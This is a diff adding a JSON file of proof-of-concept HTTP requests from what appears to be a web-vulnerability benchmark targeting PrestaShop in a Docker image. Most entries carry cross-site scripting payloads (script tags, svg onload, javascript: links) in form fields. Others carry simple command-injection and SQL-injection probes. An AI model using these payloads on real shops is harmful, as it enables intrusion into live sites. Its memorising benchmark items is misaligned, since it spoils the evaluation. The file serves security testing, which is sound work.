@@ -1,0 +1,758 @@
+[
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/contact-us",
+    "post_data": {
+      "FILEUPLOAD": [
+        "jaekpot.jpg"
+      ],
+      "from": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ],
+      "id_contact": [
+        "2"
+      ],
+      "message": [
+        "xuefeng20011024"
+      ],
+      "submitMessage": [
+        "Send"
+      ],
+      "token": [
+        "6f6dc135596a24787b1cc1a28c6ab89c"
+      ],
+      "url": [
+        "xuefeng20011024"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693da3f415b09",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_1f95d0",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/contact-us",
+    "post_data": {
+      "FILEUPLOAD": [
+        "jaekpot.jpg"
+      ],
+      "from": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ],
+      "id_contact": [
+        "2"
+      ],
+      "message": [
+        "xuefeng20011024"
+      ],
+      "submitMessage": [
+        "Send"
+      ],
+      "token": [
+        "6f6dc135596a24787b1cc1a28c6ab89c"
+      ],
+      "url": [
+        "xuefeng20011024"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693da3f415b09",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_2af6aa",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/contact-us",
+    "post_data": {
+      "FILEUPLOAD": [
+        "jaekpot.jpg"
+      ],
+      "from": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ],
+      "id_contact": [
+        "2"
+      ],
+      "message": [
+        "xuefeng20011024"
+      ],
+      "submitMessage": [
+        "Send"
+      ],
+      "token": [
+        "6f6dc135596a24787b1cc1a28c6ab89c"
+      ],
+      "url": [
+        "xuefeng20011024"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693da3f415b09",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_4de0ad",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/admin123/index.php",
+    "post_data": {
+      "compare_date_from": [
+        ""
+      ],
+      "compare_date_to": [
+        ""
+      ],
+      "date_from": [
+        "2025-03-01"
+      ],
+      "date_to": [
+        "2025-04-01"
+      ],
+      "datepickerFrom": [
+        "2025-03-01"
+      ],
+      "datepickerTo": [
+        "2025-04-01"
+      ],
+      "preselectDateRange": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ],
+      "submitDateRange": [
+        ""
+      ]
+    },
+    "query_params": {
+      "controller": [
+        "AdminDashboard"
+      ],
+      "token": [
+        "4fca737a6cbf77141944282b60bb23ed"
+      ]
+    },
+    "request_id": "requests.693da406357f1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_5b8c0d",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "GET",
+    "path": "/8-home-accessories",
+    "post_data": {},
+    "query_params": {
+      "q": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ]
+    },
+    "request_id": "requests.693da3e98ad64",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_5d984b",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/admin123/index.php/sell/customers/",
+    "post_data": {
+      "customer[_token]": [
+        "j0lg6bmv_2v0Srghw0Ao-LInKw_hHLAkeY_SzbV9AnM"
+      ],
+      "customer[actions][search]": [
+        ""
+      ],
+      "customer[active]": [
+        ""
+      ],
+      "customer[date_add][from]": [
+        "ls '"
+      ],
+      "customer[date_add][to]": [
+        "2025-12-12"
+      ],
+      "customer[default_group]": [
+        ""
+      ],
+      "customer[email]": [
+        "xuefeng20011024"
+      ],
+      "customer[firstname]": [
+        "xuefeng20011024"
+      ],
+      "customer[id_customer]": [
+        ".20011024"
+      ],
+      "customer[lastname]": [
+        "xuefeng20011024"
+      ],
+      "customer[newsletter]": [
+        ""
+      ],
+      "customer[optin]": [
+        ""
+      ],
+      "customer[social_title]": [
+        ""
+      ],
+      "input-admin_customers_toggle_newsletter_subscription-1": [
+        "0"
+      ],
+      "input-admin_customers_toggle_newsletter_subscription-2": [
+        "1"
+      ],
+      "input-admin_customers_toggle_newsletter_subscription-3": [
+        "1"
+      ],
+      "input-admin_customers_toggle_partner_offer_subscription-1": [
+        "0"
+      ],
+      "input-admin_customers_toggle_partner_offer_subscription-2": [
+        "1"
+      ],
+      "input-admin_customers_toggle_partner_offer_subscription-3": [
+        "0"
+      ],
+      "input-admin_customers_toggle_status-1": [
+        "0"
+      ],
+      "input-admin_customers_toggle_status-2": [
+        "0"
+      ],
+      "input-admin_customers_toggle_status-3": [
+        "1"
+      ]
+    },
+    "query_params": {
+      "_token": [
+        "l-F3TBZBW_Jqd_ZiKMfG8RWBnoMuxTbUsIXbo0Hl-nY"
+      ]
+    },
+    "request_id": "requests.693da3fe2fd3c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_69aa48",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/contact-us",
+    "post_data": {
+      "FILEUPLOAD": [
+        "jaekpot.jpg"
+      ],
+      "from": [
+        "javascript:alert(987890)"
+      ],
+      "id_contact": [
+        "2"
+      ],
+      "message": [
+        "xuefeng20011024"
+      ],
+      "submitMessage": [
+        "Send"
+      ],
+      "token": [
+        "6f6dc135596a24787b1cc1a28c6ab89c"
+      ],
+      "url": [
+        "xuefeng20011024"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693da3f415b09",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_6f7cec",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/module/ps_emailsubscription/subscription",
+    "post_data": {
+      "action": [
+        "0"
+      ],
+      "blockHookName": [
+        "displayFooterBefore"
+      ],
+      "email": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693da3e875a85",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_784f8b",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/identity",
+    "post_data": {
+      "birthday": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "email": [
+        "</title></option><script>xss(18013122)</script>"
+      ],
+      "firstname": [
+        "frjhdhrn"
+      ],
+      "id_gender": [
+        "</title></option><script>xss(54678292)</script>"
+      ],
+      "lastname": [
+        "frjhdhrn"
+      ],
+      "new_password": [
+        "</title></option><script>xss(48992592)</script>"
+      ],
+      "newsletter": [
+        "</title></option><script>xss(480131)</script>"
+      ],
+      "password": [
+        "</title></option><script>xss(84344075)</script>"
+      ],
+      "submitCreate": [
+        "1"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693da3e4a2fd6",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_84c501",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/contact-us",
+    "post_data": {
+      "FILEUPLOAD": [
+        "jaekpot.jpg"
+      ],
+      "from": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "id_contact": [
+        "2"
+      ],
+      "message": [
+        "xuefeng20011024"
+      ],
+      "submitMessage": [
+        "Send"
+      ],
+      "token": [
+        "6f6dc135596a24787b1cc1a28c6ab89c"
+      ],
+      "url": [
+        "xuefeng20011024"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693da3f415b09",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_946c5d",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/contact-us",
+    "post_data": {
+      "FILEUPLOAD": [
+        "jaekpot.jpg"
+      ],
+      "from": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "id_contact": [
+        "2"
+      ],
+      "message": [
+        "xuefeng20011024"
+      ],
+      "submitMessage": [
+        "Send"
+      ],
+      "token": [
+        "6f6dc135596a24787b1cc1a28c6ab89c"
+      ],
+      "url": [
+        "xuefeng20011024"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693da3f415b09",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_a7efce",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "GET",
+    "path": "/admin123/index.php/sell/catalog/categories",
+    "post_data": {},
+    "query_params": {
+      "_token": [
+        "l-F3TBZBW_Jqd_ZiKMfG8RWBnoMuxTbUsIXbo0Hl-nY"
+      ],
+      "category[filters][description]": [
+        "xuefeng20011024"
+      ],
+      "category[filters][id_category]": [
+        "xuefeng20011024"
+      ],
+      "category[filters][name]": [
+        "xuefeng20011024"
+      ],
+      "category[filters][position]": [
+        "`1`%27"
+      ]
+    },
+    "request_id": "requests.693da4056b834",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_baa214",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/admin123/index.php",
+    "post_data": {
+      "ajax": [
+        "1"
+      ],
+      "controller": [
+        "AdminLogin"
+      ],
+      "email": [
+        "23212010038@m.fudan.edu.cn"
+      ],
+      "passwd": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ],
+      "redirect": [
+        "http://10.176.36.21:50048/admin123/&token=03f7d8af31ce9c11bca285fd8f097633"
+      ],
+      "submitLogin": [
+        "1"
+      ],
+      "token": [
+        ""
+      ]
+    },
+    "query_params": {
+      "rand": [
+        "1765487172604"
+      ]
+    },
+    "request_id": "requests.693da404d417c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_c4fc84",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/admin123/index.php",
+    "post_data": {
+      "compare_date_from": [
+        ""
+      ],
+      "compare_date_to": [
+        ""
+      ],
+      "date_from": [
+        "2025-03-01"
+      ],
+      "date_to": [
+        "2025-04-01"
+      ],
+      "datepickerFrom": [
+        "2025-03-01"
+      ],
+      "datepickerTo": [
+        "2025-04-01"
+      ],
+      "preselectDateRange": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "submitDateRange": [
+        ""
+      ]
+    },
+    "query_params": {
+      "controller": [
+        "AdminDashboard"
+      ],
+      "token": [
+        "4fca737a6cbf77141944282b60bb23ed"
+      ]
+    },
+    "request_id": "requests.693da406357f1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_cc644f",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/identity",
+    "post_data": {
+      "birthday": [
+        "thjpoewh"
+      ],
+      "customer_privacy": [
+        "</title></option><script>xss(47857532)</script>"
+      ],
+      "email": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "firstname": [
+        "thjpoewh"
+      ],
+      "id_gender": [
+        "</title></option><script>xss(12066829)</script>"
+      ],
+      "lastname": [
+        "thjpoewh"
+      ],
+      "new_password": [
+        "</title></option><script>xss(51268956)</script>"
+      ],
+      "newsletter": [
+        "</title></option><script>xss(33417381)</script>"
+      ],
+      "optin": [
+        "</title></option><script>xss(28636416)</script>"
+      ],
+      "password": [
+        "</title></option><script>xss(25178963)</script>"
+      ],
+      "psgdpr": [
+        "</title></option><script>xss(5612939)</script>"
+      ],
+      "submitCreate": [
+        "1"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693da3e73085c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_cfebff",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/contact-us",
+    "post_data": {
+      "FILEUPLOAD": [
+        "jaekpot.jpg"
+      ],
+      "from": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "id_contact": [
+        "2"
+      ],
+      "message": [
+        "xuefeng20011024"
+      ],
+      "submitMessage": [
+        "Send"
+      ],
+      "token": [
+        "6f6dc135596a24787b1cc1a28c6ab89c"
+      ],
+      "url": [
+        "xuefeng20011024"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693da3f415b09",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_d28d77",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "POST",
+    "path": "/admin123/index.php",
+    "post_data": {
+      "DASHACTIVITY_CART_ABANDONED_MAX": [
+        "ls '"
+      ],
+      "DASHACTIVITY_CART_ABANDONED_MIN": [
+        "x\" jaekpot-attribute=\"18073818\" fix=\""
+      ],
+      "DASHACTIVITY_CART_ACTIVE": [
+        "15"
+      ],
+      "DASHACTIVITY_VISITOR_ONLINE": [
+        "15"
+      ],
+      "submitDashConfig": [
+        "1"
+      ]
+    },
+    "query_params": {
+      "controller": [
+        "AdminDashboard"
+      ],
+      "token": [
+        "4fca737a6cbf77141944282b60bb23ed"
+      ]
+    },
+    "request_id": "requests.693da3ea0d1ec",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_e71a3b",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "GET",
+    "path": "/admin123/index.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "ajax": [
+        "true"
+      ],
+      "configs[DASHPRODUCT_NBR_SHOW_BEST_SELLER]": [
+        "10"
+      ],
+      "configs[DASHPRODUCT_NBR_SHOW_LAST_ORDER]": [
+        "10"
+      ],
+      "configs[DASHPRODUCT_NBR_SHOW_MOST_VIEWED]": [
+        "10"
+      ],
+      "configs[DASHPRODUCT_NBR_SHOW_TOP_SEARCH]": [
+        "10"
+      ],
+      "configs[submitDashConfig]": [
+        "1"
+      ],
+      "controller": [
+        "AdminDashboard"
+      ],
+      "hook": [
+        "hookDashboardZoneTwo"
+      ],
+      "module": [
+        "dashproducts"
+      ],
+      "token": [
+        "4fca737a6cbf77141944282b60bb23ed"
+      ]
+    },
+    "request_id": "requests.693da3f09cb05",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_eb6d09",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "prestashop",
+    "application_name": "PrestaShop",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-prestashop-v0.1.0",
+    "method": "GET",
+    "path": "/4-men",
+    "post_data": {},
+    "query_params": {
+      "order": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ]
+    },
+    "request_id": "requests.693da3ff04e63",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/PrestaShop/PrestaShop",
+    "vuln_id": "vuln_function_fe97cd",
+    "vuln_type": "xss"
+  }
+]
